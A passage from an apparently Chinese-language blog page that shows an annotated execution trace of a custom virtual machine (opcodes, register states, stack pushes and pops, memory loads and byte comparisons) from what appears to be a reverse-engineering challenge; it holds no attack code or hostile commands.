<span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa3 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa4 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xe<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xe<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa5 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa6 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x4 d<br><span class="hljs-selector-attr">[s]</span> ... read_memory<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>上面的是接受用户输入前的代码，下面的是接收用户输入后的处理逻辑。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa7 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c								<span class="hljs-comment">// c = 0x20 [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa8 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span>								<span class="hljs-comment">// b = 0x3a [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa9 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span>								<span class="hljs-comment">// a = 0x59 [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xaa f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>xaa<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>xaa								<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xab f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span>								<span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xac f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span>								<span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xad f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c								<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xae f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xaf f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span>								<span class="hljs-comment">// [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xb1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x7d<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>x7d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x80 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x81 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x82 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> ADD d <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x83 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d								<span class="hljs-comment">// [0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x84 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>xce<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>xce<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x30 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xcf f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">a</span> c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x9e c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>x84 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xff<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xff<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3c <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">a</span> d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xaa c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd3 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd4 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span>								<span class="hljs-comment">// [0x3b,0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd5 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span>								<span class="hljs-comment">// [0xa9,0x3b,0x84,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x3b <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd6 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> LDM <span class="hljs-selector-tag">a</span> = *<span class="hljs-selector-tag">a</span>									<span class="hljs-comment">// a = a1[0x3b] = 0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd7 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> LDM <span class="hljs-selector-tag">b</span> = *<span class="hljs-selector-tag">b</span>									<span class="hljs-comment">// b = a1[0xa9] = 0x6b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6b c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd8 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> CMP <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x6b c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xd9 f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xa9 c:<span class="hljs-number">0</span>xc d:<span class="hljs-number">0</span>xff s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xda f:<span class="hljs-number">0</span>xc<br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 